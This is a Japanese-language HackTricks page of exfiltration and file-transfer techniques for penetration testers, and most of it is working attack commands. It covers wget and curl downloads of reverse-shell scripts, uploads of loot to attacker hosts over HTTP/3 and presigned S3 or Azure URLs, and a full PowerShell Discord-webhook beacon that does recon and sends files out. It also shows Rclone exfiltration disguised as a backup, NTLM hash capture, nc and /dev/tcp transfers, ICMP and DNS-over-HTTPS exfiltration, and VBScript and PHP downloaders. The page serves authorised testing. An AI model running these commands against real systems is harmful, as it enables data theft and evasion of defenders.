# Exfiltration

{{#include ../banners/hacktricks-training.md}}

> [!TIP]
> `C:\Users\Public` に loot をステージングし、正規のバックアップを装って Rclone で exfiltration する一連の例については、以下のワークフローを確認してください。

{{#ref}}
../windows-hardening/windows-local-privilege-escalation/dll-hijacking/advanced-html-staged-dll-sideloading.md
{{#endref}}

## 情報を exfiltration するためによくホワイトリストに登録されているドメイン

悪用可能な、よくホワイトリストに登録されているドメインを見つけるには、[https://lots-project.com/](https://lots-project.com/) を確認してください。

## Base64 のコピー\&ペースト

**Linux**

```bash
base64 -w0 <file> #Encode file
base64 -d file #Decode file
```

**Windows**

```
certutil -encode payload.dll payload.b64
certutil -decode payload.b64 payload.dll
```

## HTTP

**Linux**

```bash
wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
fetch 10.10.14.14:8000/shell.py #FreeBSD
```

**Windows**

```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
bitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf C:\downloads\examplefile.pdf

#PS
(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"

Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output
#OR
Start-BitsTransfer -Source $url -Destination $output -Asynchronous
```

### ファイルをアップロード

- [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
- [**GET と POST（ヘッダーも）を出力する SimpleHttpServer**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
- Python モジュール [uploadserver](https://pypi.org/project/uploadserver/):

```bash
# Listen to files
python3 -m pip install --user uploadserver
python3 -m uploadserver
# With basic auth:
# python3 -m uploadserver --basic-auth hello:world

# Send a file
curl -X POST http://HOST/upload -H -F 'files=@file.txt'
# With basic auth:
# curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
```

### **HTTPSサーバー**

```python
# from https://gist.github.com/dergachev/7028596
# taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
# generate server.xml with the following command:
#    openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
# run as follows:
#    python simple-https-server.py
# then in your browser, visit:
#    https://localhost:443

### PYTHON 2
import BaseHTTPServer, SimpleHTTPServer
import ssl

httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), SimpleHTTPServer.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
###

### PYTHON3
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

httpd = HTTPServer(('0.0.0.0', 443), BaseHTTPRequestHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="./server.pem", server_side=True)
httpd.serve_forever()
###

### USING FLASK
from flask import Flask, redirect, request
from urllib.parse import quote
app = Flask(__name__)
@app.route('/')
def root():
    print(request.get_json())
    return "OK"
if __name__ == "__main__":
    app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
###
```

### HTTP/3 / QUIC

egress controlsが従来の**TCP/443**検査向けに調整されている一方で、**UDP/443**には寛容な場合、**HTTP/3**を強制することで、転送をTLS-over-TCPではなく**QUIC**経由にできます。攻撃者側のエンドポイントは、ネイティブなHTTP/3サポートが必要です（たとえば、すでに`Alt-Svc: h3`を通知しているリバースプロキシやアップロードエンドポイント）。

```bash
# Strict: fail if QUIC/H3 is not available
curl --http3-only -T loot.7z https://attacker-h3.example/upload

# Opportunistic: prefer H3, but fall back to h2/h1 if QUIC fails
curl --http3 -T loot.7z https://attacker-h3.example/upload

# Learn the server's Alt-Svc advertisement and reuse it
curl --alt-svc /tmp/altsvc.cache https://attacker-h3.example/
curl --alt-svc /tmp/altsvc.cache -T loot.7z https://attacker-h3.example/upload
```

2025年の研究論文（QUIC-Exfil）では、QUICの暗号化されたヘッダーと動的なアドレス変更により、ファイアウォールレベルでのexfiltration検出が、TLSやDNSベースのチャネルより困難になる可能性があることが示されました。また、exfiltrationをサーバー側の接続移行に見せかける、server-preferred-address methodも実証されました。<sup>[[9]](#references)</sup>

### 事前署名済み / 委任型オブジェクトストレージアップロード

短期間有効な**signed URL**を発行または取得できれば、被害者側で必要なのは通常のHTTPSクライアントだけです。これにより、ホストへのcloud SDKのインストールや、長期間有効な認証情報の配置を避けられます。<sup>[[8]](#references)</sup> また、一般的なオブジェクトストレージのトラフィックに紛れ込ませることもできます。

**Linux / macOS（AWS S3 pre-signed `PUT`）**

```bash
curl -X PUT -T loot.7z \
  -H 'Content-Type: application/octet-stream' \
  'https://bucket.s3.amazonaws.com/case123/loot.7z?<presigned-query>'
```

**Windows PowerShell（AWS S3 pre-signed `PUT`）**

```powershell
Invoke-WebRequest -Method Put -InFile .\loot.7z `
  -ContentType 'application/octet-stream' `
  -Uri $presignedUrl
```

**Azure Blob SAS URL**

```bash
curl -X PUT --data-binary @loot.7z \
  -H 'x-ms-blob-type: BlockBlob' \
  -H 'Content-Type: application/octet-stream' \
  'https://acct.blob.core.windows.net/container/loot.7z?<sas>'
```

Notes:
- Pre-signed URLs / SAS tokens は通常、**path**、**HTTP method**、**expiration**を制限します。<sup>[[8]](#references)[[10]](#references)</sup>
- Azure Blob の `Put Blob` では、`x-ms-blob-type: BlockBlob` が必須です。<sup>[[10]](#references)</sup>
- このパターンは、`curl`、`Invoke-WebRequest`、または raw HTTPS `PUT` を実行できるカスタム implant でうまく機能します。

### goshs

[goshs](https://github.com/patrickhener/goshs) は、`python3 -m http.server` の代替となる単一バイナリです。<sup>[[4]](#references)</sup>
upload、download、WebDAV、SFTP、SMB、TLS、authentication、share links、OOB collaboration 機能（DNS、SMTP、NTLM hash capture）をサポートしています。<sup>[[4]](#references)</sup>

```bash
# Serve current directory on port 8000
goshs

# Serve with HTTPS (self-signed)
goshs -s -ss

# Serve with basic auth
goshs -b user:password

# Upload-only mode
goshs -uo

# Read-only mode
goshs -ro

# Capture SMB NTLM hashes
goshs -smb -smb-domain CORP

# DNS callback server
goshs -dns -dns-ip 10.10.10.10

# SMTP callback server
goshs -smtp -smtp-domain [REDACTED]

# Tunnel via localhost.run (no port forwarding needed)
goshs -tunnel
```

## C2とデータexfiltrationのためのWebhooks（Discord/Slack/Teams）

Webhooksは、JSONと任意のファイルパートを受け付ける書き込み専用のHTTPSエンドポイントです。信頼されたSaaSドメインとして許可されていることが多く、OAuth/APIキーも不要なため、手軽なbeaconingやexfiltrationに役立ちます。<sup>[[5]](#references)[[6]](#references)</sup>

主なポイント:
- エンドポイント: Discordでは https://discord.com/api/webhooks/<id>/<token> を使用します
- payload_jsonという名前のパートに{"content":"..."}を含め、任意のファイルパート（名前はfile）を添えて、POST multipart/form-dataを送信します。
- オペレーターのループパターン: 定期的なbeacon -> ディレクトリのrecon -> 対象を絞ったファイルexfil -> reconダンプ -> sleep。HTTP 204 NoContent/200 OKで配信を確認できます。

PowerShell PoC（Discord）:

```powershell
# 1) Configure webhook and optional target file
$webhook = "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE"
$target  = Join-Path $env:USERPROFILE "Documents\SENSITIVE_FILE.bin"

# 2) Reuse a single HttpClient
$client = [System.Net.Http.HttpClient]::new()

function Send-DiscordText {
    param([string]$Text)
    $payload = @{ content = $Text } | ConvertTo-Json -Compress
    $jsonContent = New-Object System.Net.Http.StringContent($payload, [System.Text.Encoding]::UTF8, "application/json")
    $mp = New-Object System.Net.Http.MultipartFormDataContent
    $mp.Add($jsonContent, "payload_json")
    $resp = $client.PostAsync($webhook, $mp).Result
    Write-Host "[Discord] text -> $($resp.StatusCode)"
}

function Send-DiscordFile {
    param([string]$Path, [string]$Name)
    if (-not (Test-Path $Path)) { return }
    $bytes = [System.IO.File]::ReadAllBytes($Path)
    $fileContent = New-Object System.Net.Http.ByteArrayContent(,$bytes)
    $fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")
    $json = @{ content = ":package: file exfil: $Name" } | ConvertTo-Json -Compress
    $jsonContent = New-Object System.Net.Http.StringContent($json, [System.Text.Encoding]::UTF8, "application/json")
    $mp = New-Object System.Net.Http.MultipartFormDataContent
    $mp.Add($jsonContent, "payload_json")
    $mp.Add($fileContent, "file", $Name)
    $resp = $client.PostAsync($webhook, $mp).Result
    Write-Host "[Discord] file $Name -> $($resp.StatusCode)"
}

# 3) Beacon/recon/exfil loop
$ctr = 0
while ($true) {
    $ctr++
    # Beacon
    $beacon = "━━━━━━━━━━━━━━━━━━`n:satellite: Beacon`n```User: $env:USERNAME`nHost: $env:COMPUTERNAME```"
    Send-DiscordText -Text $beacon

    # Every 2nd: quick folder listing
    if ($ctr % 2 -eq 0) {
        $dirs = @("Documents","Desktop","Downloads","Pictures")
        $acc = foreach ($d in $dirs) {
            $p = Join-Path $env:USERPROFILE $d
            $items = Get-ChildItem -Path $p -ErrorAction SilentlyContinue | Select-Object -First 3 -ExpandProperty Name
            if ($items) { "`n$d:`n - " + ($items -join "`n - ") }
        }
        Send-DiscordText -Text (":file_folder: **User Dirs**`n━━━━━━━━━━━━━━━━━━`n```" + ($acc -join "") + "```")
    }

    # Every 3rd: targeted exfil
    if ($ctr % 3 -eq 0) { Send-DiscordFile -Path $target -Name ([IO.Path]::GetFileName($target)) }

    # Every 4th: basic recon
    if ($ctr % 4 -eq 0) {
        $who = whoami
        $ip  = ipconfig | Out-String
        $tmp = Join-Path $env:TEMP "recon.txt"
        "whoami:: $who`r`nIPConfig::`r`n$ip" | Out-File -FilePath $tmp -Encoding utf8
        Send-DiscordFile -Path $tmp -Name "recon.txt"
    }

    Start-Sleep -Seconds 20
}
```

注:
- 同様のパターンは、incoming webhookを使う他のコラボレーションプラットフォーム（Slack/Teams）にも適用できます。必要に応じてURLとJSON schemaを調整してください。
- Discord DesktopのキャッシュアーティファクトのDFIRとwebhook/APIの復元については、以下の関連ページを参照してください。<sup>[[7]](#references)</sup>

{{#ref}}
../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/discord-cache-forensics.md
{{#endref}}

## Rclone（cloud/object-storageからのexfiltration）

現代のオペレーターは、まず**lootをローカルにステージング**し、その後[Rclone](https://rclone.org/)を使って、通常のbackupやsyncジョブのように見せかけて転送することがよくあります。実用的なパターンは次のとおりです。

1. 通常のremote（`s3`、`webdav`、`drive`、`mega`など）
2. **内容とファイル名をクライアント側で暗号化する**`crypt` wrapper
3. プロバイダーがオブジェクトサイズの上限を設けている場合や、アップロード単位を小さくしたい場合は、任意で`chunker` wrapper

```bash
# 1) Create the storage backend remote (interactive)
rclone config              # ex: remote

# 2) Wrap it with client-side encryption
rclone config              # ex: secret -> remote:path

# 3) Optional: create a chunker overlay for large objects
rclone config              # ex: overlay -> secret:

# 4) Upload staged data
rclone copy /loot secret:$(hostname)-$(date +%F) \
  --transfers 2 --checkers 2 --bwlimit 4M
# If you created the chunker wrapper, upload to overlay:... instead
```

メモ:
- `crypt` はファイルの内容と名前の両方を暗号化できます。<sup>[[3]](#references)</sup>
- `chunker` は大きなファイルを透過的に分割し、ダウンロード時に再構成します。<sup>[[11]](#references)</sup>
- `rclone.conf` は `crypt` のシークレットを**難読化**した形式で保存しますが、保存時の強力な保護ではありません。<sup>[[3]](#references)</sup> 短期間の操作では、専用の一時設定ファイルを使用し、操作後に削除することをおすすめします。より長期間保持する必要がある場合は、`rclone.conf` をそのままディスクに置くのではなく、暗号化された設定の取り扱い（`RCLONE_CONFIG_PASS` / `--password-command`）をおすすめします。<sup>[[11]](#references)</sup>
- 対象がすでに **OneDrive**、**Google Drive**、または **Dropbox** と同期している場合、同期対象のディレクトリに loot をコピーすれば、新たな転送バイナリを配置せずに、すでに承認されているクライアントを利用できます。

{{#ref}}
../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/local-cloud-storage.md
{{#endref}}

## FTP

### FTP サーバー（python）

```bash
pip3 install pyftpdlib
python3 -m pyftpdlib -p 21
```

### FTP server (NodeJS)

```
sudo npm install -g ftp-srv --save
ftp-srv ftp://0.0.0.0:9876 --root /tmp
```

### FTPサーバー (pure-ftp)

```bash
apt-get update && apt-get install pure-ftp
```

```bash
#Run the following script to configure the FTP server
#!/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pwd useradd fusr -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart
```

### **Windows** クライアント

```bash
#Work well with python. With pure-ftp use fusr:ftp
echo open 10.11.0.41 21 > ftp.txt
echo USER anonymous >> ftp.txt
echo anonymous >> ftp.txt
echo bin >> ftp.txt
echo GET mimikatz.exe >> ftp.txt
echo bye >> ftp.txt
ftp -n -v -s:ftp.txt
```

## SMB

サーバーとしてのKali

```bash
kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
#For new Win10 versions
impacket-smbserver -smb2support -user test -password test test `pwd`
```

または、**sambaを使用して** smb共有を作成します:

```bash
apt-get install samba
mkdir /tmp/smb
chmod 777 /tmp/smb
#Add to the end of /etc/samba/smb.conf this:
[public]
    comment = Samba on Ubuntu
    path = /tmp/smb
    read only = no
    browsable = yes
    guest ok = Yes
#Start samba
service smbd restart
```

Windows

```bash
CMD-Wind> \\10.10.14.14\path\to\exe
CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials

WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali"
WindPS-2> cd new_disk:
```

### goshs
[goshs](https://github.com/patrickhener/goshs) は、単一バイナリで動作する代替ツールで、SMB 経由でファイルを提供し、接続してきたクライアントから NTLM hash を取得します。<sup>[[4]](#references)</sup>

```bash
# Start SMB server with NTLM hash capture
goshs -smb -smb-domain CORP

# Also works for plain HTTP file serving
goshs
```

## SCP

攻撃者側で SSHd が起動している必要があります。

```bash
scp <username>@<Attacker_IP>:<directory>/<filename>
```

## SSHFS

被害者がSSHを使用している場合、攻撃者は被害者のディレクトリを攻撃者側にマウントできます。

```bash
sudo apt-get install sshfs
sudo mkdir /mnt/sshfs
sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
```

## NC

```bash
nc -lvnp 4444 > new_file
nc -vn <IP> 4444 < exfil_file
```

## /dev/tcp

### 被害者からファイルをダウンロードする

```bash
nc -lvnp 80 > file #Inside attacker
cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
```

### 被害者にファイルをアップロードする

```bash
nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
# Inside victim
exec 6< /dev/tcp/10.10.10.10/4444
cat <&6 > file.txt
```

**@BinaryShadow\_** に感謝

## **ICMP**

```bash
# To exfiltrate the content of a file via pings you can do:
xxd -p -c 4 /path/file/exfil | while read line; do ping -c 1 -p $line <IP attacker>; done
#This will 4bytes per ping packet (you could probably increase this until 16)
```

```python
from scapy.all import *
#This is ippsec receiver created in the HTB machine Mischief
def process_packet(pkt):
    if pkt.haslayer(ICMP):
        if pkt[ICMP].type == 0:
            data = pkt[ICMP].load[-4:] #Read the 4bytes interesting
            print(f"{data.decode('utf-8')}", flush=True, end="")

sniff(iface="tun0", prn=process_packet)
```

## DNS over HTTPS (DoH)

従来のUDP/53 DNSの通信が目立つ、またはブロックされている一方で、外向きのHTTPS通信が広く許可されている場合は、通常のDNSラベルを使ったexfiltrationパターンを、公開リゾルバーへの**DoH**リクエストに組み込めます。各ラベルはDNSの63バイト制限を大幅に下回る長さにし、Base32などのDNSで安全に使える文字セットを使用してください。

```bash
# Encode -> split into DNS-safe labels -> send via DoH
base32 -w0 /tmp/loot.bin | tr -d '=' | tr 'A-Z' 'a-z' | fold -w32 | \
  nl -nrz -w4 -s. | while read chunk; do
    curl --http2 -s \
      -H 'accept: application/dns-json' \
      "https://dns.google/resolve?name=${chunk}.exf.attacker.tld&type=TXT" \
      >/dev/null
  done
```

`exf.attacker.tld` の権威 DNS サーバーで、クエリを数値プレフィックス順に並べ替え、Base32 ストリームを再構築します。これにより、従来の UDP/53 DNS ではなく、resolver への HTTPS 内に通信を留められます。<sup>[[2]](#references)</sup>

双方向 DNS tunnel のツール（`iodine`、`dnscat2` など）については、[tunneling のページ](tunneling-and-port-forwarding.md)を確認してください。

## **SMTP**

SMTP サーバーにデータを送信できる場合は、python でデータを受信するための SMTP を作成できます。

```bash
sudo python -m smtpd -n -c DebuggingServer :25
```

### goshs

[goshs](https://github.com/patrickhener/goshs) を使うと、OOB exfiltration のシナリオでメールコールバックを捕捉するための SMTP サーバーをすばやく起動できます。<sup>[[4]](#references)</sup>

```bash
# Start SMTP callback server
goshs -smtp -smtp-domain [REDACTED]
```

受信したメールと callback は、ターミナル出力に直接表示されます。
DNS callback server と組み合わせることで、OOB を全面的にカバーできます。

```bash
# DNS + SMTP combined
goshs -dns -dns-ip 10.10.10.10 -smtp -smtp-domain [REDACTED]
```

## TFTP

XPおよび2003ではデフォルトで有効です（他の環境ではインストール時に明示的に追加する必要があります）

Kaliでは、**TFTPサーバーを起動します**:

```bash
#I didn't get this options working and I prefer the python option
mkdir /tftp
atftpd --daemon --port 69 /tftp
cp /path/tp/nc.exe /tftp
```

**PythonでのTFTPサーバー:**

```bash
pip install ptftpd
ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
```

**被害者**からKaliサーバーに接続します：

```bash
tftp -i <KALI-IP> get nc.exe
```

## PHP

PHP の oneliner でファイルをダウンロードします:

```bash
echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
```

## VBScript

```bash
Attacker> python -m SimpleHTTPServer 80
```

**被害者**

```bash
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http =CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

```bash
cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
```

## Debug.exe

`debug.exe` プログラムはバイナリを検査できるだけでなく、**hexから再構築する機能**も備えています。つまり、バイナリのhexデータを与えることで、`debug.exe` はバイナリファイルを生成できます。ただし、debug.exe には**最大64 kbのファイルまでしかアセンブルできない制限**がある点に注意してください。<sup>[[1]](#references)</sup>

```bash
# Reduce the size
upx -9 nc.exe
wine exe2bat.exe nc.exe nc.txt
```

次に、そのテキストをwindows-shellにコピー＆ペーストすると、nc.exeというファイルが作成されます。

## References

- [1] [Windowsへのファイル転送](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
- [2] [Google Public DNS - DNS-over-HTTPS (DoH)](https://developers.google.com/speed/public-dns/docs/doh)
- [3] [Rclone `crypt` backend](https://rclone.org/crypt/)
- [4] [goshs](https://github.com/patrickhener/goshs)
- [5] [C2としてのDiscordと、キャッシュに残された証拠](https://www.pentestpartners.com/security-blog/discord-as-a-c2-and-the-cached-evidence-left-behind/)
- [6] [Discord Webhooks – Webhookの実行](https://discord.com/developers/docs/resources/webhook#execute-webhook)
- [7] [Discord Forensic Suite（cache parser）](https://github.com/jwdfir/discord_cache_parser)
- [8] [事前署名付きURLを使用したオブジェクトのアップロード - Amazon S3](https://docs.aws.amazon.com/AmazonS3/latest/userguide/PresignedUrlUploadObject.html)
- [9] [QUIC-Exfil: QUICのServer Preferred Address機能を悪用したデータ窃取攻撃](https://arxiv.org/abs/2505.05292)
- [10] [Put Blob（REST API） - Azure Storage](https://learn.microsoft.com/en-us/rest/api/storageservices/put-blob)
- [11] [Rcloneのドキュメント](https://rclone.org/docs/#configuration-encryption)
{{#include ../banners/hacktricks-training.md}}
